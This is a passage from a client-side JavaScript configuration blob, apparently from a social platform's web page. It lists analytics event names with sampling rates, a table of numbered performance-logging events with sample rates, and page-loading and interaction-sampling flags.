                    businessmanager_bmlistrowimpression_augl: 1,
                    businessmanager_bmlistviewinteraction_augl: 1,
                    businessmanager_bmlistviewtoggle_augl: 1,
                    businessmanager_bmnavigationlevel_augl: 1,
                    businessmanager_bmnavigationlevelended_augl: 1,
                    businessmanager_bmopenassetintoolaction_augl: 1,
                    businessmanager_bmpaneload_augl: 1,
                    businessmanager_bmpaneloadended_augl: 1,
                    businessmanager_bmpaneopen_augl: 1,
                    businessmanager_bmpaneopenended_augl: 1,
                    businessmanager_bmserverexception_augl: 1,
                    businessmanager_bmusertabaddasset_augl: 1,
                    businessmanager_bmvalidationerror_augl: 1,
                    businessmanager_bmvettingpageinitialload_augl: 1,
                    businessmanager_bmvettingpageinitialloadended_augl: 1,
                    businessmanager_coreappexperience_augl: 1,
                    businessmanager_coreappexperienceended_augl: 1,
                    businessmanager_coreinteractionaccordianmenu_augl: 1,
                    businessmanager_coreinteractionbutton_augl: 1,
                    businessmanager_coreinteractioncheckbox_augl: 1,
                    businessmanager_coreinteractiondropdown_augl: 1,
                    businessmanager_coreinteractiondropdownended_augl: 1,
                    businessmanager_coreinteractionradiobutton_augl: 1,
                    businessmanager_coreinteractiontextinput_augl: 1,
                    businessmanager_coreinteractiontextinputended_augl: 1,
                    businessmanager_coreinteractiontoggle_augl: 1,
                    businessmanager_coreuserinteraction_augl: 1,
                    businessmanager_coreuserinteractionended_augl: 1,
                    businessmanager_coreviewmodal_augl: 1,
                    businessmanager_coreviewmodalended_augl: 1,
                    candidate_portal_give_feedback: 1,
                    changed_cause: 1,
                    chatroom_attachment_chat_button_tapped: 1,
                    chatroom_join_request_cancelled: 1,
                    chatroom_join_request_submitted: 1,
                    cix_account_status_vpvd: 1,
                    cix_warning_screens: 1,
                    click_donate_monthly: 1,
                    click_donate_once: 1,
                    click_donation_history_item: 1,
                    click_like_button: 1,
                    click_open_edit_group_fundraiser_settings: 1,
                    click_other_amount_button: 1,
                    click_suggested_amount_button: 1,
                    click_unlike_button: 1,
                    comet_feed_story_menu_action: 10000,
                    comet_feed_vpvd_test: 1,
                    comet_ineligibility_opt_out_event: 1,
                    comet_media_options_click: 10000,
                    comet_media_remove_tag: 10000,
                    comet_media_tag: 10000,
                    comet_media_vpvd: 1,
                    comet_news_feed_eof: 1,
                    comet_news_feed_eof_unmounted: 1,
                    comet_news_feed_loaded: 1,
                    comet_opt_in_upsell_interaction: 1,
                    comet_opt_out_survey: 1,
                    comet_opt_out_survey_feedback: 1,
                    comet_story_attachments: 1,
                    comet_topnav_item_click: 1,
                    comet_topnav_item_impression: 1,
                    comment_inline_seen: 1,
                    comment_inline_xout: 1,
                    commerce_pdp_product_tag_click: 1,
                    commerce_see_more_from_shop_card_click: 1,
                    commerce_view_product_tag: 1,
                    commerce_view_product_tag_hscroll: 1,
                    commerce_view_product_tag_pill: 1,
                    commerce_view_product_tag_pill_dwelled: 1,
                    commerce_view_product_tagged_post: 1,
                    commerce_view_see_more_from_shop: 1,
                    community_resources_click_link_mobile: 1,
                    community_resources_share_link_mobile: 1,
                    consent_flow_interactions: 1,
                    content_manager_content_detail_view_cancel_flow: 1,
                    content_manager_content_detail_view_enter_flow: 1,
                    content_manager_content_detail_view_exit_flow: 1,
                    content_manager_content_detailed_view_impression: 1,
                    content_manager_content_item_click: 1,
                    content_manager_tab_item_click: 1,
                    content_manager_workspace_impression: 1,
                    coworker_opt_out_flow: 1,
                    create_fundraiser_click: 1,
                    create_living_room_action_link_impression: 1,
                    deferred_feedback_experience: 1,
                    delete_media_attempted: 1,
                    donate_click: 1,
                    donation_impact_dismiss_prompt: 1,
                    edit_group_fundraiser_settings_begin: 1,
                    end_fundraiser_begin: 1,
                    external_metric_consumption_validation_event: 1,
                    fbt_impressions_batch: 1,
                    friends_center_opened: 1,
                    frtp_survey_response: 1,
                    fundraiser_add_organizers: 1,
                    fundraiser_chat_support_click: 1,
                    fundraiser_hub_category_click: 1,
                    fundraiser_more_button_click: 1,
                    fundraiser_payout_setup_click: 1,
                    fundraiser_see_all_click: 1,
                    gaming_video_level_up_qp: 1,
                    griffin_tab_open: 1,
                    hub_activity_link_click: 1,
                    invite_click: 1,
                    kototoro_comment_create_attempted: 1,
                    kototoro_comment_created: 1,
                    kototoro_comment_delete_attempted: 1,
                    kototoro_comment_deleted: 1,
                    kototoro_comment_emoji_selected: 1,
                    kototoro_comment_exited: 1,
                    kototoro_comment_follow_upsell_action: 1,
                    kototoro_comment_follow_upsell_shown: 1,
                    kototoro_comment_launched: 1,
                    kototoro_comment_liked: 1,
                    kototoro_comment_mention_selected_user: 1,
                    kototoro_comment_mention_view_canceled: 1,
                    kototoro_comment_mention_view_shown: 1,
                    kototoro_comment_unliked: 1,
                    kttr_fb_stories_button_click: 1,
                    kttr_fb_stories_button_exposure: 1,
                    kttr_fb_stories_upsell: 1,
                    kttr_ig_feed_crosspost_composer: 1,
                    kttr_ig_feed_crosspost_sharesheet: 1,
                    kttr_ig_stories_crosspost_composer: 1,
                    kttr_ig_stories_crosspost_sharesheet: 1,
                    kttr_share_to_feed_error: 1,
                    kttr_share_to_story_error: 1,
                    lasso_composer_fb_stories_toggle: 1,
                    lasso_composer_fb_timeline_toggle: 1,
                    lasso_composer_fb_toggle: 1,
                    lasso_composer_ig_feed_toggle: 1,
                    lasso_composer_ig_stories_toggle: 1,
                    learning_click_component: 1,
                    lh_digest_logging: 1,
                    live_join_group_cta_click: 1,
                    live_trace_www_video_player: 1,
                    load_group_fundraiser_settings_row: 1,
                    log_messenger_frx_events_in_cix_screen: 1,
                    ls_business_welcome_page_composer_hided: 1,
                    ls_business_welcome_page_get_started_button_tapped: 1,
                    ls_business_welcome_page_start: 1,
                    ls_cta_click_client_handling_success: 1,
                    ls_cta_displayed_button_tapped: 1,
                    ls_did_tap_call_to_action: 1,
                    ls_messenger_integrity_block_facebook_confirmed: 1,
                    ls_messenger_integrity_block_facebook_failed: 1,
                    ls_messenger_integrity_block_facebook_succeeded: 1,
                    ls_messenger_integrity_block_facebook_tapped: 1,
                    ls_messenger_integrity_block_messages_confirmed: 1,
                    ls_messenger_integrity_block_messages_failed: 1,
                    ls_messenger_integrity_block_messages_succeeded: 1,
                    ls_messenger_integrity_block_messages_tapped: 1,
                    ls_messenger_integrity_block_view_enter: 1,
                    ls_messenger_integrity_learn_more_tapped: 1,
                    ls_messenger_integrity_unblock_facebook_confirmed: 1,
                    ls_messenger_integrity_unblock_facebook_failed: 1,
                    ls_messenger_integrity_unblock_facebook_succeeded: 1,
                    ls_messenger_integrity_unblock_facebook_tapped: 1,
                    ls_messenger_integrity_unblock_messages_confirmed: 1,
                    ls_messenger_integrity_unblock_messages_failed: 1,
                    ls_messenger_integrity_unblock_messages_succeeded: 1,
                    ls_messenger_integrity_unblock_messages_tapped: 1,
                    ls_persistent_menu_client_handling_success: 1,
                    ls_persistent_menu_icon_tapped: 1,
                    ls_persistent_menu_is_set_up: 1,
                    managedlift_coreappexperience_augl: 1,
                    managedlift_coreappexperienceended_augl: 1,
                    managedlift_coreinteractionbutton_augl: 1,
                    managedlift_coreinteractioncheckbox_augl: 1,
                    managedlift_coreinteractioncollapse_augl: 1,
                    managedlift_coreinteractionexpand_augl: 1,
                    managedlift_coreinteractionmouseover_augl: 1,
                    managedlift_coreinteractionmouseoverended_augl: 1,
                    managedlift_coreinteractionpanetab_augl: 1,
                    managedlift_coreinteractionradiobutton_augl: 1,
                    managedlift_coreinteractionsearchbar_augl: 1,
                    managedlift_coreinteractionsearchbarended_augl: 1,
                    managedlift_coreuserinteraction_augl: 1,
                    managedlift_coreuserinteractionended_augl: 1,
                    managedlift_coreviewmodal_augl: 1,
                    managedlift_coreviewmodalended_augl: 1,
                    managedlift_mlapierror_augl: 1,
                    managedlift_mlerror_augl: 1,
                    managedlift_mlfieldset_augl: 1,
                    managedlift_mltypeaheadselect_augl: 1,
                    managedlift_mlvalidationerror_augl: 1,
                    mentorship: 1,
                    mentorship_cohort: 1,
                    mentorship_user: 1,
                    misinfo_frontend: 1,
                    mk_client_event: 1,
                    news_digest_content_impression_event: 1,
                    news_digest_outbound_click_event: 1,
                    news_digest_primary_click_event: 1,
                    news_digest_secondary_click_event: 1,
                    news_digest_unit_impression_event: 1,
                    notif_list_bottom_collision: 10000,
                    open_cause_beneficiary_selector: 1,
                    open_friend_beneficiary_selector_click: 1,
                    open_seen_summary: 1,
                    pages_composer_composer_cancel_flow: 1,
                    pages_composer_composer_enter_flow: 1,
                    pages_composer_composer_focus_acquired: 1,
                    pages_composer_composer_focus_lost: 1,
                    pages_composer_composer_impression: 1,
                    pages_composer_composer_submit_flow: 1,
                    pages_composer_composer_submit_flow_failure: 1,
                    pages_composer_composer_submit_flow_success: 1,
                    pages_composer_consolidated_entry_click: 1,
                    pages_composer_draft_post_cancel_flow: 1,
                    pages_composer_draft_post_edit_enter_flow: 1,
                    pages_composer_draft_post_edit_submit_flow: 1,
                    pages_composer_draft_post_enter_flow: 1,
                    pages_composer_draft_post_submit_flow: 1,
                    pages_composer_draft_reminder_card_impression: 1,
                    pages_composer_draft_reminder_unit_impression: 1,
                    pages_composer_footer_setting_button_click: 1,
                    pages_composer_media_attachment_button_click: 1,
                    pages_composer_media_attachment_button_impression: 1,
                    pages_composer_offer_composer_cancel_flow: 1,
                    pages_composer_offer_composer_enter_flow: 1,
                    pages_composer_offer_composer_photo_uploader_submit_flow: 1,
                    pages_composer_offer_composer_photo_uploader_submit_flow_failure: 1,
                    pages_composer_offer_composer_photo_uploader_submit_flow_success: 1,
                    pages_composer_offer_composer_submit_flow: 1,
                    pages_composer_offer_composer_submit_flow_failure: 1,
                    pages_composer_offer_composer_submit_flow_success: 1,
                    pages_composer_offer_composer_update_value: 1,
                    pages_composer_preview_button_click: 1,
                    pages_composer_schedule_post_cancel_flow: 1,
                    pages_composer_schedule_post_enter_flow: 1,
                    pages_composer_schedule_post_submit_flow: 1,
                    pages_inbox_impression: 1,
                    pages_launchpoint_pages_you_manage_click: 1,
                    pages_launchpoint_view_message_click: 1,
                    pages_launchpoint_view_notification_click: 1,
                    pages_message_thread_impression: 1,
                    pages_page_action_click: 1,
                    pages_page_action_impression: 1,
                    pages_page_address_click: 1,
                    pages_page_card_impression: 1,
                    pages_page_card_see_all_click: 1,
                    pages_page_cover_click: 1,
                    pages_page_cover_impression: 1,
                    pages_page_email_click: 1,
                    pages_page_get_directions_click: 1,
                    pages_page_like_chaining_unit_impression: 1,
                    pages_page_map_click: 1,
                    pages_page_message_click: 1,
                    pages_page_notification_menu_impression: 1,
                    pages_page_photo_album_click: 1,
                    pages_page_photo_click: 1,
                    pages_page_settings_impression: 1,
                    pages_page_surface_impression: 1,
                    pages_page_video_click: 1,
                    pages_page_website_click: 1,
                    pages_permalink_impression: 1,
                    partner_home_view_partner: 1,
                    people_you_may_follow: 1,
                    perf: 1,
                    pii_action_flow: 1,
                    political_ads_infosheet: 1,
                    post_debugger_usage: 1,
                    privacy_checkup_event: 1,
                    qp_action: 1,
                    qp_impression: 1,
                    regular_pymk_add: 1,
                    regular_pymk_imp: 1,
                    regular_pymk_profile: 1,
                    regular_pymk_xout: 1,
                    report_fundraiser_click: 1,
                    save_click: 1,
                    save_item_impression: 1,
                    save_surface_impression: 1,
                    saved_dashboard_imp: 1,
                    saved_dashboard_list_landing_imp: 1,
                    saved_see_all_lists_view_imp: 1,
                    search_result_page_logging_inline_action: 1,
                    search_result_page_logging_item_clicked: 1,
                    search_result_page_logging_results_loaded: 1,
                    search_result_page_logging_viewport_view: 1,
                    search_results_logging_module_unit_data: 1,
                    search_results_logging_result_unit_data: 1,
                    search_typeahead_logging_session: 1,
                    sextortion_victim_support_option_clicked: 1,
                    share_click: 1,
                    share_dialog_unified_composer: 1,
                    smart_compose_candidates_generated: 1,
                    smart_compose_candidates_queried: 1,
                    smart_compose_matching_suggestion: 1,
                    smart_compose_suggestion_clicked: 1,
                    smart_compose_suggestion_displayed: 1,
                    tap_add_to_pages_story: 1,
                    tap_creator_item: 1,
                    tap_nonprofit_item: 1,
                    tap_select_page: 1,
                    toggle_group_fundraiser_creation_permissions: 1,
                    toggle_group_fundraiser_feature_setting: 1,
                    ufi_share_menu_copy_link: 1,
                    unidash_bladerunner_events: 1,
                    vehicle_entity_page_user_action_event: 1,
                    verse: 1,
                    video_action_source_event: 1,
                    video_search_relevancy_feedback: 1,
                    view_bookmark_hub_component: 1,
                    view_fundraiser_click: 1,
                    view_fundraiser_page_component: 1,
                    view_fundraiser_payment_settings_click: 1,
                    view_nonprofit_click: 1,
                    view_payout_overview_click: 1,
                    vod_pnc_messenger_cta_click: 1,
                    vod_pnc_people_sheet_impression: 1,
                    vod_pnc_people_sheet_thumbnail_impression: 1,
                    vod_pnc_see_all_reactions_click: 1,
                    volunteering_click_unit: 1,
                    volunteering_view_unit: 1,
                    voter_registration_attachment_tap_change_state: 1,
                    voter_registration_post_impression: 1,
                    voter_registration_post_tap_register: 1,
                    voter_registration_qp_tap_edit_location: 1,
                    voter_registration_state_selector_tap_state: 1,
                    weather_bookmark_forecast_scrolled: 1,
                    weather_bookmark_impression: 1,
                    weather_bookmark_scroll_forecast: 1,
                    weather_bookmark_settings_tapped: 1,
                    weather_bookmark_tap_city_tab: 1,
                    weather_bookmark_tap_future_day: 1,
                    weather_bookmark_tap_hourly_forecast: 1,
                    weather_bookmark_tap_nowcast: 1,
                    weather_daily_notifications_mutation_error: 1,
                    weather_daily_notifications_turned_off: 1,
                    weather_daily_notifications_turned_on: 1,
                    weather_live_alerts_mutation_error: 1,
                    weather_live_alerts_turned_off: 1,
                    weather_live_alerts_turned_on: 1,
                    weather_settings_add_city: 1,
                    weather_settings_daily_notification_use_current_location: 1,
                    weather_settings_delete_city: 1,
                    weather_settings_error_state_dismissed: 1,
                    weather_settings_error_state_fixed: 1,
                    weather_settings_impression: 1,
                    weather_settings_notification_location_tapped: 1,
                    weather_settings_tap_city_row: 1,
                    weather_settings_temperature_unit_changed: 1,
                    work_shift_cover_detail_screen_message_event: 1,
                    work_shift_cover_feed_attachment_click_to_detail_event: 1,
                    work_shift_cover_feed_attachment_message_event: 1,
                    work_thanks_mobile_ui_confirm_button_clicked: 1,
                    work_thanks_mobile_ui_dialog_opened: 1,
                    attempt_to_send_reply: 1,
                    bi_mlex_ad_history_click: 1,
                    bi_mlex_ad_history_impression: 1,
                    bi_mlex_feedback_survey_evolution_response: 1,
                    camera_roll_cancelled: 1,
                    camera_roll_finished: 1,
                    camera_roll_folder_in_dropdown_clicked: 1,
                    camera_roll_header_camera_clicked: 1,
                    camera_roll_header_cancel_button_clicked: 1,
                    camera_roll_header_folder_clicked: 1,
                    camera_roll_header_next_button_clicked: 1,
                    camera_roll_magnifying_glass_button_clicked: 1,
                    camera_roll_media_item_clicked: 1,
                    camera_roll_opened: 1,
                    close_story: 1,
                    composer_cancel: 1,
                    composer_entry: 1,
                    composer_focus_acquired: 1,
                    composer_focus_lost: 1,
                    composer_init: 1,
                    composer_post: 1,
                    composer_post_cancel: 1,
                    composer_post_failure: 1,
                    composer_post_mutation_start: 1,
                    composer_post_server_content_rendered: 1,
                    composer_post_success: 1,
                    composer_publish_flow: 1,
                    crisis_click_unit: 1,
                    crisis_tool_view_page: 1,
                    crisis_view_unit: 1,
                    feed_friend_request_confirm: 1,
                    feed_friend_request_delete: 1,
                    feed_friend_request_imp: 1,
                    feed_friend_request_profile: 1,
                    marketplace_click: 1,
                    marketplace_feed_load: 1,
                    marketplace_impression: 1,
                    marketplace_surface_enter: 1,
                    marketplace_surface_exit: 1,
                    open_media: 1,
                    open_story: 1,
                    pymk_add: 1,
                    pymk_imp: 1,
                    pymk_profile: 1,
                    pymk_xout: 1,
                    request_click: 1,
                    request_seen: 1,
                    saved_collection_ego_item_image_clicked: 1,
                    send_story_post_failed_notification: 1,
                    stories_interactive_feedback: 1,
                    story_card_impression: 1,
                    story_card_timespent: 1,
                    story_interactive_item_click: 1,
                    story_interactive_item_rendering: 1,
                    story_navigation: 1,
                    story_profile_impression: 1,
                    why_covered_ccs_link_followed: 1,
                    why_covered_ccs_snippet_viewed: 1,
                    why_covered_error_generating_cms: 1,
                    why_covered_how_snippet_viewed: 1
                }
            }, 4308], ["QuickLogConfig", [], {
                qpl_events: {
                    "393276": {sampleRate: 50},
                    "655575": {sampleRate: 1},
                    "655576": {sampleRate: 5000},
                    "655584": {sampleRate: 1},
                    "2097243": {sampleRate: 250},
                    "2097246": {sampleRate: 1},
                    "3473463": {sampleRate: 1},
                    "3473464": {sampleRate: 1},
                    "3473465": {sampleRate: 1},
                    "3735589": {sampleRate: 100},
                    "3735590": {sampleRate: 1000},
                    "3735591": {sampleRate: 100},
                    "3735592": {sampleRate: 1000},
                    "3735593": {sampleRate: 1000},
                    "3735594": {sampleRate: 1000},
                    "3735595": {sampleRate: 100},
                    "3735596": {sampleRate: 1000},
                    "3735597": {sampleRate: 1000},
                    "3735598": {sampleRate: 100},
                    "3735599": {sampleRate: 1000},
                    "3735600": {sampleRate: 100},
                    "3735601": {sampleRate: 100},
                    "3735602": {sampleRate: 10000},
                    "3735603": {sampleRate: 10000},
                    "3735604": {sampleRate: 100},
                    "3735605": {sampleRate: 100},
                    "3735606": {sampleRate: 1},
                    "3735608": {sampleRate: 250},
                    "3735609": {sampleRate: 250},
                    "3735610": {sampleRate: 250},
                    "3735611": {sampleRate: 250},
                    "3735612": {sampleRate: 250},
                    "3735613": {sampleRate: 250},
                    "3735614": {sampleRate: 250},
                    "3735615": {sampleRate: 250},
                    "3735616": {sampleRate: 250},
                    "3735617": {sampleRate: 250},
                    "7733271": {sampleRate: 1},
                    "7995396": {sampleRate: 100},
                    "7995398": {sampleRate: 100},
                    "7995399": {sampleRate: 100},
                    "7995400": {sampleRate: 1},
                    "7995401": {sampleRate: 1},
                    "7995402": {sampleRate: 1},
                    "7995403": {sampleRate: 100},
                    "7995404": {sampleRate: 100},
                    "7995408": {sampleRate: 100},
                    "7995409": {sampleRate: 100},
                    "7995411": {sampleRate: 100},
                    "11075606": {sampleRate: 100},
                    "11075649": {sampleRate: 1},
                    "11075653": {sampleRate: 1},
                    "11075654": {sampleRate: 1},
                    "11075666": {sampleRate: 100},
                    "11075668": {sampleRate: 1},
                    "11075669": {sampleRate: 1},
                    "11075674": {sampleRate: 1},
                    "12451850": {sampleRate: 4},
                    "12451853": {sampleRate: 10000},
                    "12451854": {sampleRate: 1},
                    "12451859": {sampleRate: 1},
                    "13238313": {sampleRate: 100},
                    "13238314": {sampleRate: 100},
                    "13238353": {sampleRate: 100},
                    "13238354": {sampleRate: 100},
                    "13238355": {sampleRate: 100},
                    "13238356": {sampleRate: 100},
                    "13238357": {sampleRate: 100},
                    "13238392": {sampleRate: 100},
                    "14549005": {sampleRate: 10000},
                    "17825794": {sampleRate: 250},
                    "19202053": {sampleRate: 100},
                    "19202054": {sampleRate: 1},
                    "19202055": {sampleRate: 10},
                    "19202056": {sampleRate: 10},
                    "19202071": {sampleRate: 10},
                    "19202072": {sampleRate: 10},
                    "19202075": {sampleRate: 1},
                    "19202077": {sampleRate: 100},
                    "19202078": {sampleRate: 10},
                    "19202079": {sampleRate: 1},
                    "19202080": {sampleRate: 100},
                    "19202081": {sampleRate: 100},
                    "22347782": {sampleRate: 100},
                    "23265284": {sampleRate: 1},
                    "23265285": {sampleRate: 1},
                    "23265286": {sampleRate: 1},
                    "23855105": {sampleRate: 1},
                    "23855106": {sampleRate: 1},
                    "23855107": {sampleRate: 1},
                    "23855108": {sampleRate: 1},
                    "23855109": {sampleRate: 1},
                    "25296897": {sampleRate: 1},
                    "25296900": {sampleRate: 10000},
                    "25296901": {sampleRate: 1},
                    "25296902": {sampleRate: 1},
                    "25296903": {sampleRate: 10000},
                    "25296904": {sampleRate: 10000},
                    "25296905": {sampleRate: 10000},
                    "25296906": {sampleRate: 10000},
                    "25952266": {sampleRate: 1},
                    "26869761": {sampleRate: 1},
                    "26869762": {sampleRate: 1},
                    "26869763": {sampleRate: 1},
                    "26869764": {sampleRate: 1},
                    "26869765": {sampleRate: 1},
                    "26869766": {sampleRate: 1},
                    "27459585": {sampleRate: 10000},
                    "27459588": {sampleRate: 5000},
                    "27459589": {sampleRate: 1},
                    "27459590": {sampleRate: 10},
                    "27459591": {sampleRate: 1},
                    "27787270": {sampleRate: 1},
                    "27983873": {sampleRate: 1},
                    "27983874": {sampleRate: 1},
                    "27983875": {sampleRate: 1},
                    "27983876": {sampleRate: 1},
                    "27983877": {sampleRate: 1},
                    "29818881": {sampleRate: 1},
                    "29818882": {sampleRate: 1},
                    "29818883": {sampleRate: 1},
                    "29818884": {sampleRate: 1},
                    "29884423": {sampleRate: 10},
                    "29949953": {sampleRate: 1},
                    "29949954": {sampleRate: 1},
                    "29949955": {sampleRate: 1},
                    "30408705": {sampleRate: 1},
                    "30408706": {sampleRate: 1},
                    "30408707": {sampleRate: 1},
                    "30408708": {sampleRate: 1},
                    "30408709": {sampleRate: 1},
                    "30408710": {sampleRate: 1},
                    "30408711": {sampleRate: 1},
                    "30408712": {sampleRate: 1},
                    "30605313": {sampleRate: 1},
                    "30605314": {sampleRate: 1},
                    "30605315": {sampleRate: 1},
                    "30605316": {sampleRate: 1},
                    "30605317": {sampleRate: 1},
                    "30605319": {sampleRate: 1},
                    "30605320": {sampleRate: 1},
                    "30605321": {sampleRate: 1},
                    "30605322": {sampleRate: 1},
                    "30605323": {sampleRate: 1},
                    "30605324": {sampleRate: 1},
                    "30605325": {sampleRate: 1},
                    "30605326": {sampleRate: 1},
                    "30605327": {sampleRate: 1},
                    "30605328": {sampleRate: 1},
                    "30605329": {sampleRate: 1},
                    "30605330": {sampleRate: 1},
                    "30605331": {sampleRate: 1},
                    "30605332": {sampleRate: 1},
                    "30605333": {sampleRate: 1},
                    "30605334": {sampleRate: 1},
                    "30605335": {sampleRate: 1},
                    "30605336": {sampleRate: 1},
                    "30605337": {sampleRate: 1},
                    "30605338": {sampleRate: 1},
                    "30605339": {sampleRate: 1},
                    "30605340": {sampleRate: 1},
                    "30605341": {sampleRate: 1},
                    "30605342": {sampleRate: 1},
                    "30605343": {sampleRate: 1},
                    "30605344": {sampleRate: 1},
                    "30605345": {sampleRate: 1},
                    "30605346": {sampleRate: 1},
                    "30605347": {sampleRate: 1},
                    "30605348": {sampleRate: 1},
                    "30605349": {sampleRate: 1},
                    "30605350": {sampleRate: 1},
                    "30605351": {sampleRate: 1},
                    "30605352": {sampleRate: 1},
                    "30605353": {sampleRate: 1},
                    "30605354": {sampleRate: 1},
                    "30605355": {sampleRate: 1},
                    "30605356": {sampleRate: 1},
                    "30605357": {sampleRate: 1},
                    "30605358": {sampleRate: 1},
                    "30605360": {sampleRate: 1},
                    "30605361": {sampleRate: 1},
                    "30605362": {sampleRate: 1},
                    "30605363": {sampleRate: 1},
                    "30605364": {sampleRate: 1},
                    "30605365": {sampleRate: 1},
                    "30605366": {sampleRate: 1},
                    "30605367": {sampleRate: 1},
                    "30605368": {sampleRate: 1},
                    "30605369": {sampleRate: 1},
                    "30605370": {sampleRate: 1},
                    "30605371": {sampleRate: 1},
                    "30605373": {sampleRate: 1},
                    "30605374": {sampleRate: 1},
                    "30605375": {sampleRate: 1},
                    "30605376": {sampleRate: 1},
                    "30605377": {sampleRate: 1},
                    "30605378": {sampleRate: 1},
                    "30605379": {sampleRate: 1},
                    "30605380": {sampleRate: 1},
                    "30605381": {sampleRate: 1},
                    "30605382": {sampleRate: 1},
                    "30605383": {sampleRate: 1},
                    "30605384": {sampleRate: 1},
                    "32374785": {sampleRate: 10000},
                    "32702465": {sampleRate: 1},
                    "33619969": {sampleRate: 1},
                    "33751042": {sampleRate: 1},
                    "33751043": {sampleRate: 1},
                    "33751044": {sampleRate: 1},
                    "33751045": {sampleRate: 1},
                    "33751046": {sampleRate: 1},
                    "33751047": {sampleRate: 1},
                    "33751048": {sampleRate: 1},
                    "33751049": {sampleRate: 1},
                    "35586050": {sampleRate: 1000},
                    "35586051": {sampleRate: 10},
                    "35586052": {sampleRate: 1000},
                    "35586053": {sampleRate: 1000},
                    "35651585": {sampleRate: 1},
                    "35651586": {sampleRate: 1},
                    "35651587": {sampleRate: 1},
                    "35651588": {sampleRate: 1},
                    "35651589": {sampleRate: 1},
                    "35651590": {sampleRate: 1},
                    "35651591": {sampleRate: 1},
                    "35651592": {sampleRate: 1},
                    "35651593": {sampleRate: 1},
                    "35651594": {sampleRate: 1},
                    "35651595": {sampleRate: 1},
                    "35651596": {sampleRate: 1},
                    "35651597": {sampleRate: 1},
                    "35651598": {sampleRate: 1},
                    "35651599": {sampleRate: 1},
                    "35651600": {sampleRate: 1},
                    "35651601": {sampleRate: 1},
                    "36110337": {sampleRate: 1},
                    "36110338": {sampleRate: 1},
                    "36110339": {sampleRate: 1},
                    "36241413": {sampleRate: 1},
                    "36241422": {sampleRate: 1},
                    "36241423": {sampleRate: 1},
                    "36241424": {sampleRate: 1},
                    "36306945": {sampleRate: 1},
                    "36306946": {sampleRate: 1},
                    "36306948": {sampleRate: 1},
                    "36503555": {sampleRate: 10000},
                    "36503556": {sampleRate: 10000},
                    "37093377": {sampleRate: 10000},
                    "37158913": {sampleRate: 1},
                    "37158914": {sampleRate: 1},
                    "37158915": {sampleRate: 1},
                    "37158916": {sampleRate: 1},
                    "37224449": {sampleRate: 10000},
                    "37224450": {sampleRate: 10000},
                    "37224451": {sampleRate: 10000},
                    "37224452": {sampleRate: 10000},
                    "37224453": {sampleRate: 10000},
                    "37224454": {sampleRate: 10000},
                    "37224455": {sampleRate: 10000},
                    "37224456": {sampleRate: 10000},
                    "37224457": {sampleRate: 10000},
                    "37289985": {sampleRate: 1},
                    "37289986": {sampleRate: 1},
                    "37289987": {sampleRate: 1},
                    "37289988": {sampleRate: 1},
                    "37289989": {sampleRate: 1},
                    "37289990": {sampleRate: 1},
                    "37289991": {sampleRate: 1},
                    "37289992": {sampleRate: 1},
                    "37814273": {sampleRate: 1},
                    "37814274": {sampleRate: 1},
                    "37814275": {sampleRate: 1},
                    "38338561": {sampleRate: 1},
                    "38338562": {sampleRate: 1},
                    "38338563": {sampleRate: 1},
                    "38338564": {sampleRate: 1},
                    "38928385": {sampleRate: 1},
                    "39190529": {sampleRate: 10000},
                    "39976961": {sampleRate: 1},
                    "39976962": {sampleRate: 1},
                    "39976963": {sampleRate: 1},
                    "39976964": {sampleRate: 1},
                    "39976965": {sampleRate: 1},
                    "40042497": {sampleRate: 1},
                    "40042498": {sampleRate: 1},
                    "40042499": {sampleRate: 1},
                    "40108033": {sampleRate: 1},
                    "40304641": {sampleRate: 10000},
                    "40501249": {sampleRate: 1},
                    "40501250": {sampleRate: 1},
                    "40501251": {sampleRate: 1},
                    "40828929": {sampleRate: 1},
                    "40828930": {sampleRate: 1},
                    "40828931": {sampleRate: 1},
                    "40828932": {sampleRate: 1},
                    "40828933": {sampleRate: 1},
                    "40828934": {sampleRate: 1},
                    "40828935": {sampleRate: 1},
                    "40828936": {sampleRate: 1},
                    "40894465": {sampleRate: 1},
                    "40894466": {sampleRate: 1},
                    "40894467": {sampleRate: 1},
                    "41484289": {sampleRate: 10},
                    "41484290": {sampleRate: 100},
                    "41484291": {sampleRate: 100},
                    "41484292": {sampleRate: 100},
                    "41484293": {sampleRate: 100},
                    "41484294": {sampleRate: 200},
                    "41484295": {sampleRate: 100},
                    "41484296": {sampleRate: 100},
                    "41484297": {sampleRate: 100},
                    "41484298": {sampleRate: 100},
                    "41484299": {sampleRate: 100},
                    "41484300": {sampleRate: 100},
                    "41811969": {sampleRate: 1},
                    "42532865": {sampleRate: 100},
                    "42532866": {sampleRate: 10000},
                    "42729473": {sampleRate: 1},
                    "42729474": {sampleRate: 1},
                    "42729475": {sampleRate: 1},
                    "42729476": {sampleRate: 1},
                    "43974657": {sampleRate: 1},
                    "44040193": {sampleRate: 1},
                    "44433409": {sampleRate: 1},
                    "44433410": {sampleRate: 1},
                    "44892161": {sampleRate: 1},
                    "44892162": {sampleRate: 1},
                    "44892163": {sampleRate: 1},
                    "44892164": {sampleRate: 1},
                    "44957697": {sampleRate: 100},
                    "44957698": {sampleRate: 1},
                    "44957699": {sampleRate: 1},
                    "44957700": {sampleRate: 100},
                    "44957701": {sampleRate: 1},
                    "44957702": {sampleRate: 1},
                    "45023237": {sampleRate: 1},
                    "45023238": {sampleRate: 1},
                    "45678593": {sampleRate: 1},
                    "46071809": {sampleRate: 1},
                    "46071810": {sampleRate: 1},
                    "46071811": {sampleRate: 1},
                    "46071812": {sampleRate: 1},
                    "46596097": {sampleRate: 1},
                    "46596098": {sampleRate: 1}
                }, killswitch: false
            }, 3504], ["MPageControllerGating", [], {
                shouldDeferUntilCertainNoRedirect: false,
                shouldReleaseFetcherLock: false,
                shouldLoadingScreenSetScriptPath: false,
                shouldRenderAsync404: false
            }, 2023], ["TimeSliceInteractionSV", [], {
                on_demand_reference_counting: true,
                on_demand_profiling_counters: true,
                default_rate: 1000,
                lite_default_rate: 100,
                interaction_to_lite_coinflip: {
                    ADS_INTERFACES_INTERACTION: 0,
                    ads_perf_scenario: 0,
                    ads_wait_time: 0,
                    Event: 10,
                    video_psr: 0,
                    video_stall: 0
                },
                interaction_to_coinflip: {
                    ADS_INTERFACES_INTERACTION: 1,
                    ads_perf_scenario: 1,
                    ads_wait_time: 1,
                    video_psr: 1000000,
                    video_stall: 2500000,
                    Event: 500,
                    pixelcloud_view_performance: 25,
                    intern_notify_inbox_page_load: 10,
                    intern_notify_jewel_list_load: 10,
                    tasks_initial_page_load: 1,
                    watch_carousel_left_scroll: 1,
                    watch_carousel_right_scroll: 1,
                    watch_sections_load_more: 1,
                    watch_discover_scroll: 1,
                    fbpkg_ui: 1,
